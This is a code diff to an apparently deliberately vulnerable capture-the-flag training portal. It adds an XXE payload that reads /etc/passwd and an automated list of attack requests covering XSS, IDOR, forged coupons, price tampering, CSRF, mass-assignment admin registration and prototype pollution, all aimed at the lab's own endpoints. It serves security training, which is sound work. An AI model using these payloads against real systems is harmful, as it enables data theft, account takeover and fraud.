@@ -263,6 +263,29 @@ function searchTreasury() {
   apiCall('/portal/api/treasury/search?q=' + encodeURIComponent(q));
 }
 
+function sendTradeXXE() {
+  // XXE payload to read /etc/passwd via trade import
+  const xml = '<?xml version="1.0" encoding="UTF-8"?>\n' +
+    '<!DOCTYPE trade [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n' +
+    '<trade>\n  <from>House Stark</from>\n  <to>House Lannister</to>\n' +
+    '  <goods>Valyrian Steel</goods>\n  <quantity>1</quantity>\n' +
+    '  <price>15000</price>\n  <notes>&xxe;</notes>\n</trade>';
+
+  const start = performance.now();
+  fetch('/portal/api/trade/import', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/xml',
+      ...(authToken ? { 'Authorization': 'Bearer ' + authToken } : {}),
+    },
+    body: xml,
+  }).then(async resp => {
+    const elapsed = Math.round(performance.now() - start);
+    const data = await resp.json();
+    showResponse(data, resp.status, elapsed);
+  }).catch(e => showResponse({ error: e.message }, 0, 0));
+}
+
 function makeNoneJwt() {
   // Create a JWT with algorithm=none and role=superadmin
   const header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' })).replace(/=/g, '');
@@ -317,7 +340,7 @@ function checkForFlags(obj) {
 }
 
 function updateScoreboard() {
-  const total = 30;  // Total flags available
+  const total = 48;  // Total flags available (30 original + 18 marketplace)
   const captured = capturedFlags.length;
   const pct = Math.round((captured / total) * 100);
 
@@ -402,6 +425,24 @@ const ATTACK_SEQUENCE = [
   { method: 'POST', url: "/portal/api/treasury/transfer", body: { from: "Lannister", to: "Stark", amount: -50000 }, name: "Negative Transfer" },
   { method: 'POST', url: "/portal/api/messages/send", body: { from: "attacker", to: "admin", subject: '<script>alert("XSS")</script>', body: '<img src=x onerror="alert(1)">' }, name: "Stored XSS" },
   { method: 'POST', url: "/portal/api/webhook/send", body: { url: "http://192.168.56.10:389", data: { test: true } }, name: "Webhook SSRF" },
+  // Enhanced Marketplace (Juice Shop-inspired)
+  { method: 'POST', url: "/portal/api/shop/reviews/1", body: { author: "cersei.lannister", rating: 1, comment: '<script>alert("XSS")</script>' }, name: "Stored XSS Review" },
+  { method: 'GET',  url: "/portal/api/shop/coupons/encode-sample", name: "Coupon Encoding Leak" },
+  { method: 'POST', url: "/portal/api/shop/coupon/apply", body: { encoded: btoa("SKPCOUPON|FORGED100|100|2099-12-31") }, name: "Forged Coupon" },
+  { method: 'POST', url: "/portal/api/shop/coupon/apply", body: { code: "VALAR50" }, name: "Expired Coupon" },
+  { method: 'GET',  url: "/portal/api/wallet/balance?username=cersei.lannister", name: "Wallet IDOR" },
+  { method: 'POST', url: "/portal/api/wallet/transfer", body: { from: "cersei.lannister", to: "hacker", amount: -50000 }, name: "Negative Gold Transfer" },
+  { method: 'POST', url: "/portal/api/shop/purchase-enhanced", body: { item_id: 1, quantity: -5, username: "hacker" }, name: "Negative Quantity" },
+  { method: 'POST', url: "/portal/api/shop/purchase-enhanced", body: { item_id: 1, quantity: 1, price: 1, username: "hacker" }, name: "Price Tampering" },
+  { method: 'POST', url: "/portal/api/users/change-allegiance", body: { username: "jon.snow", house: "House Lannister" }, name: "CSRF Allegiance" },
+  { method: 'GET',  url: "/portal/api/auth/security-question?username=jon.snow", name: "Security Question Leak" },
+  { method: 'POST', url: "/portal/api/auth/reset-password-security", body: { username: "jon.snow", answer: "ghost", new_password: "hacked123" }, name: "OSINT Password Reset" },
+  { method: 'POST', url: "/portal/api/auth/register-enhanced", body: { username: "hacker_" + Date.now(), password: "test", role: "admin" }, name: "Hidden Admin Role" },
+  { method: 'POST', url: "/portal/api/feedback", body: { comment: "Automated feedback", rating: 1, author: "bot" }, name: "CAPTCHA Bypass" },
+  { method: 'POST', url: "/portal/api/config/update", body: { __proto__: { isAdmin: true } }, name: "Prototype Pollution" },
+  { method: 'GET',  url: "/portal/api/score-board", name: "Score Board Discovery" },
+  { method: 'GET',  url: "/portal/api/shop/deleted-products", name: "Deleted Products" },
+  { method: 'GET',  url: "/portal/api/admin/panel", name: "Admin Panel (No Auth)" },
 ];
 
 let runnerActive = false;
